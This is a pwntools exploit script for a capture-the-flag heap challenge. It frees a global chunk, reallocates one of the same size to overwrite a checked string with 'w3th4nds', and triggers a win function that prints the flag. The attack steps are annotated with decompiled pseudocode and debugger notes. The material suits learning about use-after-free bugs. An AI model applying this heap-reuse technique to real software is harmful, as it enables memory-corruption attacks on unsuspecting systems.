#!/usr/bin/env python3

from pwn import *

e = ELF("./rookie_salvation_patched")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "46.101.181.26"  # Remote host IP
PORT = 32237  # Remote port

gdb_script = """
b main
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    
    # [0x000012a0]> pdg @ main
    #
    #     void main(void)
    #
    #     {
    #         int64_t iVar1;
    #         uint64_t uVar2;
    #         
    #         sym.banner();
    #         iVar1 = sym.imp.malloc(0x26);
    #         _obj.allocated_space = iVar1;
    #         *(iVar1 + 0x1e) = 0x6665656264616564;
    #         *(iVar1 + 0x26) = 0;
    #         while( true ) {
    #             uVar2 = sym.menu();
    #             if (uVar2 == 3) {
    #         //WARNING: Subroutine does not return
    #                 sym.road_to_salvation();
    #             }
    #             if (3 < uVar2) break;
    #             if (uVar2 == 1) {
    #                 sym.reserve_space();
    #             }
    #             else {
    #                 if (uVar2 != 2) break;
    #                 sym.obliterate();
    #             }
    #         }
    #         //WARNING: Subroutine does not return
    #         sym.fail("💀 𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝐝𝐨𝐨𝐦𝐞𝐝!\n\n");
    #     }
    #

    # [0x000012a0]> pdg @ sym.obliterate
    #
    #     void sym.obliterate(void)
    #
    #     {
    #         int64_t iVar1;
    #         int64_t in_FS_OFFSET;
    #         
    #         iVar1 = *(in_FS_OFFSET + 0x28);
    #         sym.imp.free(_obj.allocated_space);
    #         if (iVar1 != *(in_FS_OFFSET + 0x28)) {
    #         //WARNING: Subroutine does not return
    #             sym.imp.__stack_chk_fail();
    #         }
    #         return;
    #     }
    #

    # [0x000012a0]> pdg @ sym.reserve_space
    #
    #     void sym.reserve_space(void)
    #
    #     {
    #         int64_t in_FS_OFFSET;
    #         int iStack_1c;
    #         ulong uStack_18;
    #         int64_t iStack_10;
    #         
    #         iStack_10 = *(in_FS_OFFSET + 0x28);
    #         sym.info(0x3240);
    #         sym.imp.fflush(_reloc.stdout);
    #         iStack_1c = 0;
    #         sym.imp.__isoc99_scanf(0x3282,&iStack_1c);
    #         uStack_18 = sym.imp.malloc(iStack_1c);
    #         sym.info(0x3288);
    #         sym.imp.fflush(_reloc.stdout);
    #         sym.imp.__isoc99_scanf(0x2010,uStack_18);
    #         if (iStack_10 != *(in_FS_OFFSET + 0x28)) {
    #         //WARNING: Subroutine does not return
    #             sym.imp.__stack_chk_fail();
    #         }
    #         return;
    #     }

    # [0x000012a0]> pdg @ sym.road_to_salvation
    #
    #     void sym.road_to_salvation(void)
    #
    #     {
    #         int iVar1;
    #         int64_t iVar2;
    #         int64_t in_FS_OFFSET;
    #         ulong uStack_48;
    #         ulong uStack_40;
    #         ulong uStack_38;
    #         ulong uStack_30;
    #         ulong uStack_28;
    #         ulong uStack_20;
    #         ulong uStack_10;
    #         
    #         uStack_10 = *(in_FS_OFFSET + 0x28);
    #         iVar1 = sym.imp.strcmp(_obj.allocated_space + 0x1e,"w3th4nds");
    #         if (iVar1 != 0) {
    #         //WARNING: Subroutine does not return
    #             sym.fail(0x3118);
    #         }
    #         sym.success("✨ 𝐅𝐢𝐧𝐚𝐥𝐥𝐲.. 𝐓𝐡𝐞 𝐰𝐚𝐲.. 𝐎𝐮𝐭..");
    #         uStack_48 = 0;
    #         uStack_40 = 0;
    #         uStack_38 = 0;
    #         uStack_30 = 0;
    #         uStack_28 = 0;
    #         uStack_20 = 0;
    #         iVar2 = sym.imp.fopen("flag.txt",0x2fe6);
    #         if (iVar2 == 0) {
    #         //WARNING: Subroutine does not return
    #             sym.fail(0x2ff8);
    #         }
    #         sym.imp.fflush(_reloc.stdin);
    #         sym.imp.fgets(&uStack_48,0x30,iVar2);
    #         sym.imp.printf("%sH%s\n","\x1b[0m",&uStack_48);
    #         sym.imp.fflush(_reloc.stdout);
    #         //WARNING: Subroutine does not return
    #         sym.imp.exit(0);
    #     }

    p = conn()  # Establish connection to target

    # The objective is to write in "_obj.allocated_space + 0x1e" the string "w3th4nds" 
    
    p.sendlineafter(b"> ", b"2") # sym.obliterate() sym.imp.free(_obj.allocated_space);
    p.sendlineafter(b"> ", b"1")

    # pwndbg> p/x *(unsigned long*)(&allocated_space)
    # $1 = 0x55555555a720
    # pwndbg> set $ptr = 0x55555555a720
    # pwndbg> p/x ( *(unsigned long*)($ptr - 0x8) & ~0x7 )
    # $2 = 0x30
    # pwndbg> p/x ( ( *(unsigned long*)($ptr - 0x8) & ~0x7 ) - 0x10 )
    # $3 = 0x20
     
    # size of allocated_space = 0x20

    p.sendline(b"32") # Request a new chunk with the same size (32 = 0x20) so the program will asign the same chunk as allocated_space

    payload = b"A" * 0x1e + b"w3th4nds\x00" # The program will check if allocated_space + 0x1e = "w3th4nds") 
                                            # as we are now writing at allocated_space, we will need to send 0x1e bytes
                                            # and then the word the program checks followed by a \x00 because strcmp compares until a null byte 

    p.sendline(payload) # Send payload
    
    p.sendlineafter(b"> ", b"3") # Call the win function
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

